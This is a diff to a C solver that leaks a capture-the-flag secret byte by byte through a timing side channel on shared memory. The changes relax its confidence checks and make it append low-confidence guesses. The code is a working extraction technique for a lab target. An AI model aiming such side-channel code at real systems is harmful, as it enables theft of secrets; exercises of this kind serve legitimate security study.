@@ -5,18 +5,19 @@
 #include <string.h>
 
 #define SHARED_MEM_BASE 0x1337000
-#define PAGE_SIZE 0x1000
+#define TIMING_DATA_OFFSET 0x1000
 #define NUM_TRIALS 10
 
 int main() {
     sem_t *sem = (sem_t *)SHARED_MEM_BASE;
     int *index = (int *)(sem + 1);
+    uint64_t *timing_data = (uint64_t *)(SHARED_MEM_BASE + TIMING_DATA_OFFSET);
     
     char flag[256] = {0};
     
     printf("Starting flag extraction...\n");
     
-    for (int pos = 0; pos < 100; pos++) {
+    for (int pos = 0; pos < 50; pos++) {
         printf("Extracting position %d...\n", pos);
         
         uint64_t min_times[256];
@@ -33,13 +34,6 @@ int main() {
             sem_post(sem);
             usleep(5000);
             
-            // Read timing data from each page
-            uint64_t timing_data[256];
-            for (int i = 0; i < 256; i++) {
-                uint64_t *page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE + PAGE_SIZE * i);
-                timing_data[i] = *page;
-            }
-            
             // Find the fastest access time this trial
             uint64_t min_time = UINT64_MAX;
             int best_candidate = 0;
@@ -54,7 +48,12 @@ int main() {
                 }
             }
             
-            hit_counts[best_candidate]++;
+            // Count hits for the fastest candidate (include all printable chars)
+            if (best_candidate >= 0x20 && best_candidate <= 0x7e) {
+                hit_counts[best_candidate]++;
+            } else if (best_candidate == 0) {
+                hit_counts[0]++; // Count null bytes too
+            }
             
             printf("  Trial %d: '%c' (%d) timing: %lu\n", 
                    trial, (best_candidate >= 0x20 && best_candidate <= 0x7e) ? best_candidate : '?', 
@@ -66,6 +65,7 @@ int main() {
         int max_hits = 0;
         uint64_t best_time = UINT64_MAX;
         
+        // Check all possible byte values
         for (int i = 0; i < 256; i++) {
             if (hit_counts[i] > max_hits || 
                 (hit_counts[i] == max_hits && min_times[i] < best_time)) {
@@ -75,25 +75,29 @@ int main() {
             }
         }
         
-        printf("Position %d: '%c' (%d) [%d hits, min_time: %lu]\n", 
+        printf("Position %d: '%c' (%d hits, min_time: %lu)\n", 
                pos, (best_byte >= 0x20 && best_byte <= 0x7e) ? best_byte : '?', 
-               best_byte, max_hits, best_time);
+               max_hits, best_time);
         
-        // Check for end conditions
-        if (best_byte == '}' && max_hits >= 3) {
+        // Lower confidence threshold and always add the best result
+        if (max_hits >= 3 && best_byte != 0) {  // Reduced from 5 to 3
             flag[pos] = best_byte;
-            flag[pos + 1] = '\0';
-            printf("Found flag end '}' at position %d\n", pos);
-            break;
-        } else if (best_byte == 0 && max_hits >= 5) {
+            
+            // Check for flag end
+            if (best_byte == '}') {
+                flag[pos + 1] = '\0';
+                printf("Found flag end at position %d\n", pos);
+                break;
+            }
+        } else if (best_byte == 0) {
+            // Null byte - probably end of flag
             flag[pos] = '\0';
             printf("Found null terminator at position %d\n", pos);
             break;
-        } else if (max_hits >= 3) {
-            flag[pos] = best_byte;
         } else {
-            printf("Low confidence (%d hits), skipping position %d\n", max_hits, pos);
-            break;
+            // Still add the best guess even if confidence is low
+            flag[pos] = best_byte;
+            printf("Low confidence, but adding '%c'\n", best_byte);
         }
         
         printf("Current flag: %s\n\n", flag);
